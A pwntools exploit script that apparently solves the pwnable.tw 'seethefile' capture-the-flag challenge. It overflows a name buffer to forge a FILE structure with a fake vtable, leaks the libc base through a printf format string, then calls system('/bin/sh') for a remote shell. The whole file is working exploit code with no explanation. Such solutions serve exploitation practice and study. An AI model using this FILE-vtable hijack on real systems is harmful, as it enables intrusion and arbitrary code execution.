import pwn

symbol_file = '/home/user/Downloads/tools/glibc-all-in-one/libs/2.23-0ubuntu3_i386/.debug/lib/i386-linux-gnu/libc-2.23.so' # for debug only
LOCAL = False
if LOCAL:
    #gdbscript = "b openfile \nadd-symbol-file " + symbol_file
    #p = pwn.gdb.debug("./seethefile_patched", gdbscript=gdbscript) #pwn.process('./seethefile_patched')
    p = pwn.process('./seethefile_patched')
else:
    p = pwn.remote('chall.pwnable.tw', 10200)
libc = pwn.ELF('./libc_32.so.6')
elf = pwn.ELF('./seethefile_patched')

def open_file(file_name): 
    p.sendlineafter(b"Your choice :", b'1')
    p.sendlineafter(b"What do you want to see :", file_name)

def exit_prc(name):
    p.sendlineafter(b"Your choice :", b'5')
    p.sendlineafter(b'Leave your name :', name)

def leak_address():
    global p, libc
    payload = b'A'*0x20
    payload += pwn.p32(0x804b284)
    payload += b"%6$p\x00" # flag -> prepare for leak libc
    payload += b'\x00'*67
    payload += pwn.p32(0x0804b0c0) # lock
    payload += b'\x00'*72
    payload += pwn.p32(0x804B31C) #0x804B314 vtable
    payload += b'\x00'*0x20
    payload += pwn.p32(0x8048500) # _xsgetn printf@plt
    payload += b'\x00'*0x20
    payload += pwn.p32(0x08048a37) # __close main
    #exit_prc(b'\x00'*0xb4 + b"\xEF\xBE\xAD\xDE") # vtable at 0x804B314
    exit_prc(payload)
    p.sendlineafter(b"Your choice :", b'2')
    line = p.recvuntil(b"--")
    line = line[:-2].decode()
    leaked = int(line, 16)
    libc.address = leaked - 0x2fdb9
    print("[+] Leaked libc base:", hex(libc.address))
    
def execute():
    global p, libc
    payload = b'A'*0x20
    payload += pwn.p32(0x804b284)
    payload += b"/bin/sh\x00" # flag -> prepare for leak libc
    payload += b'\x00'*64
    payload += pwn.p32(0x0804b0c0) # lock
    payload += b'\x00'*72
    payload += pwn.p32(0x804B31C) #0x804B314 vtable
    payload += b'\x00'*0x20
    payload += pwn.p32(0x8048500) # _xsgetn printf@plt
    payload += b'\x00'*0x20
    payload += pwn.p32(libc.symbols['system']) # _close system
    exit_prc(payload)


open_file(b"test.txt")

leak_address()
execute()
p.interactive()
